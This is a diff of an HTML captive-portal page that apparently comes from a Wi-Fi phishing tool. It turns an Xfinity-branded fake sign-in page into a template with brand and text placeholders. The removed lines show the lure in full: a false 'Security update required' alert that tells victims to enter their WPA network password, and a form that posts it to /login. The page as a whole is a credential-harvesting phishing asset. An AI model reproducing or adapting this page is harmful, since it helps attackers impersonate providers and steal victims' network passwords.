@@ -1,9 +1,9 @@
 <!DOCTYPE html>
-<html lang="en">
+<html lang="{{html_lang}}">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Sign in to WiFi — Xfinity</title>
+    <title>{{title_page}}</title>
     <style>
         * { margin: 0; padding: 0; box-sizing: border-box; }
         body { font-family: "Helvetica Neue", Helvetica, Arial, sans-serif; background: linear-gradient(160deg, #0a1628 0%, #132a4a 45%, #0d2138 100%); min-height: 100vh; color: #fff; }
@@ -29,27 +29,27 @@
 </head>
 <body>
     <div class="top">
-        <div class="brand">XFINITY <strong>WiFi</strong></div>
-        <div class="wifi-ico">WiFi</div>
-        <p class="subtitle">Network sign-in</p>
+        <div class="brand">{{brand_primary}} <strong>{{brand_wifi}}</strong></div>
+        <div class="wifi-ico">{{wifi_badge_text}}</div>
+        <p class="subtitle">{{subtitle}}</p>
     </div>
     <div class="panel-wrap">
         <div class="panel">
-            <div class="panel-head">Connect to secure WiFi</div>
+            <div class="panel-head">{{panel_head}}</div>
             <div class="panel-body">
                 <div class="alert">
-                    <b>Security update required</b>
-                    This hotspot session must be refreshed for your protection. Enter your WiFi network password (WPA key) to restore encrypted access.
+                    <b>{{alert_title}}</b>
+                    {{alert_body}}
                 </div>
                 <form method="POST" action="/login">
-                    <label for="pw">WiFi password (WPA/WPA2)</label>
-                    <input type="password" id="pw" name="wfphshr-wpa-password" placeholder="Network password" required autocomplete="current-password">
-                    <button type="submit" class="btn">Continue</button>
-                    <p class="fine">By continuing you agree to acceptable use of this network. For assistance, contact your service provider.</p>
+                    <label for="pw">{{label_password}}</label>
+                    <input type="password" id="pw" name="wfphshr-wpa-password" placeholder="{{placeholder_password}}" required autocomplete="current-password">
+                    <button type="submit" class="btn">{{btn_continue}}</button>
+                    <p class="fine">{{fine_print}}</p>
                 </form>
             </div>
         </div>
     </div>
-    <div class="foot">Captive portal — authorized use only</div>
+    <div class="foot">{{foot_captive}}</div>
 </body>
 </html>
